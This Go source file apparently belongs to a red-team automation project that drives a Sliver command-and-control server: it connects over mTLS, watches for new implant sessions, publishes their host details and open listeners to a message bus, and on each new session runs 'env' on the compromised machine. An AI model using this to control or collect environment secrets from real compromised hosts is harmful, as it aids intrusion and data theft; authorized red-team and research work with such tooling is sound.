package c2

import (
	"context"
	"fmt"
	"io"
	"log"
	"log/slog"
	"net"
	"strings"

	"github.com/Magier/Ran/domain"
	bus "github.com/Magier/Ran/internal/bus"
	"github.com/bishopfox/sliver/client/assets"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

func makeRequest(session *clientpb.Session) *commonpb.Request {
	if session == nil {
		return nil
	}
	timeout := int64(60)
	return &commonpb.Request{
		SessionID: session.ID,
		Timeout:   timeout,
	}
}

func ConnectToSliverServer(configPath string, bus bus.MessageBus) {
	// var configPath string
	// flag.StringVar(&configPath, "config", "", "path to sliver client config file")
	// flag.Parse()

	// load the client configuration from the filesystem
	config, err := assets.ReadConfig(configPath)
	if err != nil {
		log.Fatal(err)
	}
	// connect to the server
	rpc, ln, err := transport.MTLSConnect(config)
	if err != nil {
		slog.Error(err.Error())
	}
	slog.Info("[*] Connected to sliver server")
	defer ln.Close()

	// Open the event stream to be able to collect all events sent by  the server
	eventStream, err := rpc.Events(context.Background(), &commonpb.Empty{})
	if err != nil {
		slog.Error(err.Error())
	}

	reportOpenListeners(rpc, bus, config.LHost, config.LPort)

	// infinite loop
	for {
		event, err := eventStream.Recv()
		if err == io.EOF || event == nil {
			return
		}
		// Trigger event based on type
		switch event.EventType {

		// a new session just came in
		case consts.SessionOpenedEvent:
			session := event.Session

			err = bus.Publish(SessionStarted{Session: Session{
				Id:       session.ID,
				Hostname: session.Hostname,
				Os:       session.OS,
				User:     session.Username,
			}})
			if err != nil {
				slog.Error("Error publishing session started event:", err.Error(), "")
			}

			// call any RPC you want, for the full list, see
			// https://github.com/BishopFox/sliver/blob/master/protobuf/rpcpb/services.proto
			resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
				Path:    `env`,
				Output:  true,
				Request: makeRequest(session),
			})
			if err != nil {
				log.Fatal(err)
			}
			// Don't forget to check for errors in the Response object
			if resp.Response != nil && resp.Response.Err != "" {
				log.Fatal(resp.Response.Err)
			}
		}
	}
}

func reportOpenListeners(rpc rpcpb.SliverRPCClient, bus bus.MessageBus, serverIp string, clientPort int) {
	jobs, err := rpc.GetJobs(context.Background(), &commonpb.Empty{})
	if err != nil {
		slog.Error(err.Error())
	}

	// resolve the local IP to the 'external' one, so the compromised systems can reach it
	var ip net.IP
	if serverIp == "0.0.0.0" || serverIp == "localhost" {
		ip = GetOutboundIP()
	} else {
		ip = net.ParseIP(serverIp)
	}
	for _, job := range jobs.Active {
		// no need to leak infrastructure details
		// so ignore the listener for new (multiplayer) clients
		if job.Port == uint32(clientPort) {
			continue
		}

		err = bus.Publish(ListenerReady{
			Name:     fmt.Sprintf("sliver_%s", job.Name),
			IP:       ip,
			Port:     uint(job.Port),
			Protocol: domain.Protocol(strings.ToUpper(job.Protocol)),
		})
		if err != nil {
			slog.Error("Error publishing listener event: " + err.Error())
		}
	}
}
